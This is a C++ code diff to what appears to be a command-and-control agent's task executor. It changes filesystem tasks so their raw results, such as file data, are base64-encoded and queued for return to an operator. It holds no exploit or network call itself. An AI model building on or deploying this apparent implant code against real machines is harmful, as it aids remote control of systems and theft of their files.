@@ -157,8 +157,32 @@ void Executor::StartExecutor()
                 //// FILESYSTEM
                 else if (IsTaskForFilesystem(task))
                 {
-                    HandleTaskFilesystem(this->pWinApiCustom, task);
-                    this->SetOutputInOutputQueue((PCHAR)taskId, strAgentCapResponseSuccess, FALSE);
+                    BOOL isSuccess = FALSE;
+                    LPVOID pResult = NULL;
+                    DWORD resultSize = 0;
+
+                    HandleTaskFilesystem(this->pWinApiCustom, task, &isSuccess, &pResult, &resultSize);
+
+                    // On success
+                    if (isSuccess)
+                    {
+                        // If there is result, send that
+                        if (pResult != NULL && resultSize != 0)
+                        {
+                            this->SetRawOutputInOutputQueue((PCHAR)taskId, pResult, resultSize, TRUE); // this frees pResult too
+                        }
+
+                        // Else, send generic success result
+                        else
+                        {
+                            this->SetOutputInOutputQueue((PCHAR)taskId, strAgentCapResponseSuccess, FALSE);
+                        }
+                    }
+                    // On failure
+                    else
+                    {
+                        this->SetOutputInOutputQueue((PCHAR)taskId, strAgentCapResponseFailed, FALSE);
+                    }
                 }
 
                 //// FALLBACK
@@ -205,15 +229,26 @@ void Executor::StartExecutor()
 }
 
 /*
-Enqueues Task output in global Task output queue
+Enqueues Task output (string) in global Task output queue
 */
 void Executor::SetOutputInOutputQueue(IN PCHAR taskId, IN PCHAR taskOutput, BOOL shouldFreeTaskOutputBuffer)
+{
+    this->SetRawOutputInOutputQueue(
+        taskId,
+        taskOutput,
+        StrLen(taskOutput) + 1,
+        shouldFreeTaskOutputBuffer);
+}
+
+/*
+Enqueues Task output (raw) in global Task output queue
+*/
+void Executor::SetRawOutputInOutputQueue(IN PCHAR taskId, IN LPVOID taskOutput, IN DWORD taskOutputLen, BOOL shouldFreeTaskOutputBuffer)
 {
     // Get Task ID length
     DWORD taskIdLen = StrLen(taskId);
 
-    // Convert Task string to base64
-    DWORD taskOutputLen = StrLen(taskOutput);
+    // Convert Task output to base64
     LPVOID taskOutputB64 = this->pWinApiCustom->HeapAllocCustom((((taskOutputLen + 2) / 3) * 4));
     if (taskOutputB64 == NULL)
         goto CLEANUP;
@@ -280,8 +315,7 @@ void Executor::GetTasksForSelf()
                     pTask = this->pTaskInputQueue->DequeueAt(i);
                     this->TaskInputSelfQueue.Enqueue(
                         pTask,
-                        StrLen((PCHAR)pTask) + 1
-                    );
+                        StrLen((PCHAR)pTask) + 1);
                     this->pWinApiCustom->HeapFreeCustom(pTask);
                 }
             }
